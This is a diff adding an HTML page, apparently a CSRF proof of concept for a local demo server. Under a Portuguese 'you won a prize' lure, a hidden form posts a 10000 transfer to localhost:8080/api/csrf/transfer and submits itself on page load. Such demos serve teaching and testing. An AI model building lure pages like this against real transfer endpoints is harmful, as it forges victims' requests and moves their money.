@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h1>Você ganhou um prêmio!</h1>
+
+<form action="http://localhost:8080/api/csrf/transfer" method="POST">
+    <input type="hidden" name="amount" value="10000">
+</form>
+
+<script>
+    document.forms[0].submit();
+</script>
+
+</body>
+</html>
